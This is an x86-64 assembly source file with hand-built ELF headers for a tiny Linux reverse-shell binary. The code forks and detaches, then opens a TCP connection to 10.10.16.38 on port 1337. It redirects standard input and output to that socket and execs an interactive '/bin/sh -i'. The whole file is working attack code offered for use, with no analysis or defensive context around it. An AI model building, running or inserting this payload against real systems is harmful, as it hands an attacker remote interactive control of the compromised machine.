;
; Small ELF64 binary for a reverse shell
;

bits 64

section .text

org     0x00400000

;64-bit ELF header
ehdr:
    ;ELF Magic + 2 (64-bit), 1 (LSB), 1 (ELF ver. 1), 0 (ABI ver.)
    db 0x7F, "ELF", 2, 1, 1, 0             ;e_ident

    times 8 db 0                           ;reserved (zeroes)

    dw 2                    ;e_type:       Executable file
    dw 0x3e                 ;e_machine:    AMD64
    dd 1                    ;e_version:    current version
    dq _start               ;e_entry:      program entry address (0x78)
    dq phdr - $$            ;e_phoff       program header offset (0x40)
    dq 0                    ;e_shoff       no section headers
    dd 0                    ;e_flags       no flags
    dw ehdrsize             ;e_ehsize:     ELF header size (0x40)
    dw phdrsize             ;e_phentsize:  program header size (0x38)
    dw 1                    ;e_phnum:      one program header
    dw 0                    ;e_shentsize
    dw 0                    ;e_shnum
    dw 0                    ;e_shstrndx
ehdrsize equ $ - ehdr

;64-bit ELF program header
phdr:
    dd 1                    ;p_type:       loadable segment
    dd 5                    ;p_flags       read and execute
    dq 0                    ;p_offset
    dq $$                   ;p_vaddr:      start of the current section
    dq $$                   ;p_paddr:
    dq filesize             ;p_filesz
    dq filesize             ;p_memsz
    dq 0x200000             ;p_align:      2^11=200000=11 bit boundaries

;program header size
phdrsize equ $ - phdr

; Command to execute
args:
dq args.0
dq args.1
dq 0

.0:
db '/bin/sh',0
.1:
db '-i',0

; Address to connect back to
align 8

%define htons(x) (x >> 8) | (x << 8)

addr:
dw 2
dw htons(1337)    ; port
db 10, 10, 16, 38 ; ip
dq 0
.end:

_start:

; fork
mov eax, 57
syscall

test eax, eax
jz child

xor edi, edi
mov eax, 60
syscall

child:
; setsid
mov eax, 112
syscall

; Create socket
mov edi, 2 ; domain
mov esi, 1 ; type
mov edx, 6 ; protocol
mov eax, 41
syscall

; Connect
mov edi, eax
mov esi, addr
mov edx, addr.end - addr
mov eax, 42
syscall

; Set stdio to the socket
xor esi, esi
dup2:
mov eax, 33
syscall
inc esi
cmp esi, 2
jle dup2

; Execute payload
mov edi, args.0
mov esi, args
xor edx, edx
mov eax, 59
syscall

filesize      equ     $ - $$
